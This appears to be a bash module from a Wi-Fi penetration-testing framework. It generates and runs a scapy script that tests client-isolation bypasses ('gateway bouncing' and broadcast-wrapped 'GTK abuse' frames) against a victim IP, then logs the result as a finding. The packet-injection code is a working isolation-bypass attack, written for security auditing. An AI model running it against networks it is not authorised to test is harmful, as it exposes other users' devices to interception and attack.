#!/usr/bin/env bash
# MODULE_META
# NAME="AirSnitch: Client Isolation Audit"
# CATEGORY="B"
# DEPS="B1"
# CRITICAL="no"
# TOOLS="python3,scapy,tshark"
# DESC="Audit Client Isolation bypasses based on NDSS 2026 research (AirSnitch)"
# REQS="managed_iface,gateway_ip"
# PCAP="yes"
# DECODE="none"
# PROMPTS="managed_connect"

#===============================================================================
#  modules/b10_airsnitch.sh
#  B10: AirSnitch Client Isolation Audit (Golden Wrapper)
#
#  METHODOLOGY (NDSS 2026):
#  1. Gateway Bouncing: Send packet to victim with Gateway MAC.
#  2. GTK Abuse (Conceptual): Wrap unicast IP in GTK-encrypted broadcast.
#  3. Port Stealing: Spoof victim MAC on different virtual port/frequency.
#===============================================================================

set -euo pipefail

# Inputs from Environment
INTERFACE="${WIFI_INTERFACE:-}"
GATEWAY_IP="${GATEWAY_IP:-}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="B10"

if [[ -z "$INTERFACE" ]]; then
    echo "[!] WIFI_INTERFACE not set."
    exit 1
fi

# Intelligence Insight
if [[ "${ASTRA_TARGET_RSSI:-0}" -ne 0 ]] && [[ "${ASTRA_TARGET_RSSI:-0}" -lt -75 ]]; then
    echo "[!] WARNING: Low Signal Strength (${ASTRA_TARGET_RSSI}dBm). Isolation bypass packets may be dropped."
fi

# Get Gateway IP and MAC
if [[ -z "$GATEWAY_IP" ]]; then
    GATEWAY_IP=$(ip -4 route show dev "$INTERFACE" | awk '/default/{print $3}' | head -1) || true
fi

if [[ -z "$GATEWAY_IP" ]]; then
    echo "[!] Gateway IP not detected. Connect to WiFi first."
    exit 1
fi

GATEWAY_MAC=$(ip neigh show "$GATEWAY_IP" | awk '{print $5}' | head -1) || true
if [[ -z "$GATEWAY_MAC" ]]; then
    echo "[*] Refreshing ARP cache for gateway..."
    ping -c 1 "$GATEWAY_IP" >/dev/null 2>&1 || true
    GATEWAY_MAC=$(ip neigh show "$GATEWAY_IP" | awk '{print $5}' | head -1) || true
fi

echo "[*] Initializing AirSnitch (NDSS 2026) Audit on ${INTERFACE}..."

# Identify a target client from B1 results — exclude our own interface IP only
MY_IP=$(ip -4 addr show "$INTERFACE" 2>/dev/null | awk '/inet/{print $2}' | cut -d'/' -f1 | head -1 || true)
B1_XML="${EVIDENCE_DIR}/b1_results.xml"
TARGET_VICTIM=""
if [[ -f "$B1_XML" ]]; then
    TARGET_VICTIM=$(grep "addrtype=\"ipv4\"" "$B1_XML" | grep -v "\"${MY_IP}\"" | head -1 | sed 's/.*addr="//;s/".*//') || true
fi

if [[ -z "$TARGET_VICTIM" ]]; then
    echo "[!] No target victims identified by B1. Cannot perform active AirSnitch audit."
    exit 0
fi

echo "[*] Targeting victim: $TARGET_VICTIM for isolation bypass testing..."

AIRSNITCH_PY="${EVIDENCE_DIR}/b10_airsnitch.py"
AIRSNITCH_LOG="${EVIDENCE_DIR}/b10_results.txt"

# 1. Gateway Bouncing Test (L3 Isolation Bypass)
# Enhanced scapy script to support Cross-Band / Multi-Interface if needed
cat <<EOF > "$AIRSNITCH_PY"
from scapy.all import *
import sys, time

target_ip = sys.argv[1]
gateway_mac = sys.argv[2]
iface = sys.argv[3]

print(f"[*] Starting AirSnitch Vector 1: Gateway Bouncing against {target_ip}")
# We send an ICMP Echo Request to the victim IP, but use the Gateway's MAC as destination.
# If isolation is broken at L3, the AP will forward this to the gateway, which routes it back to the victim.
p = Ether(dst=gateway_mac) / IP(dst=target_ip) / ICMP()
res = srp1(p, iface=iface, timeout=2, verbose=0)

if res:
    print(f"[!] VULNERABILITY CONFIRMED: Gateway Bouncing successful!")
    print(f"    Response from {res.src} ({res[IP].src})")
else:
    print("[+] Gateway Bouncing failed (Isolation enforced).")

print(f"[*] Starting AirSnitch Vector 2: GTK Abuse (Simulated)")
# Logic: Unicast IP inside Broadcast Ethernet frame
# This test assumes the attacker knows the GTK (standard behavior once connected).
p_gtk = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(dst=target_ip) / ICMP()
sendp(p_gtk, iface=iface, count=3, verbose=0)
print("[*] GTK-Abuse frames injected. Monitor victim for unsolicited responses.")
EOF

"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 20 --status "Executing AirSnitch bypass tests..."
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    python3 "$AIRSNITCH_PY" "$TARGET_VICTIM" "$GATEWAY_MAC" "$INTERFACE" | tee "$AIRSNITCH_LOG" || true
else
    python3 "$AIRSNITCH_PY" "$TARGET_VICTIM" "$GATEWAY_MAC" "$INTERFACE" > "$AIRSNITCH_LOG" 2>&1 || true
fi

# 2. Reporting
"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 90 --status "Analyzing bypass results..."
if grep -q "VULNERABILITY CONFIRMED" "$AIRSNITCH_LOG"; then
    echo "[!] SUCCESS: AIRSNITCH ISOLATION BYPASS CONFIRMED!"
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "Client Isolation Bypass (AirSnitch)" \
        --severity CRITICAL \
        --desc "The target network is vulnerable to the AirSnitch (NDSS 2026) attack. Specifically, Gateway Bouncing was used to bypass L2/L3 isolation and communicate directly with isolated client $TARGET_VICTIM." \
        --target "$TARGET_VICTIM" \
        --evidence "$AIRSNITCH_LOG" \
        --rationale "AirSnitch research proves that architectural flaws in WiFi networking allow attackers to bypass client isolation. This enables MITM attacks, session hijacking, and direct exploitation of devices that are supposedly protected by the network."
else
    echo "[+] AirSnitch audit complete. Isolation appears robust against basic bouncing."
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "[$TC_ID] Audit Complete" \
        --severity INFO \
        --desc "Completed AirSnitch (NDSS 2026) isolation bypass audit against $TARGET_VICTIM. No immediate bypass detected." \
        --target "Global" \
        --evidence "$AIRSNITCH_LOG" \
        --rationale "Network infrastructure that correctly enforces both L2 and L3 isolation is resistant to the Gateway Bouncing vector of AirSnitch."
fi


"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"

# Hold window if in tactical mode so user can see final output/errors
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    echo -e "\n${ASTRA_COLOR_BOLD:-}[*] Mission Complete. Window will close in 5s...${ASTRA_COLOR_RESET:-}"
    sleep 5
fi

exit 0
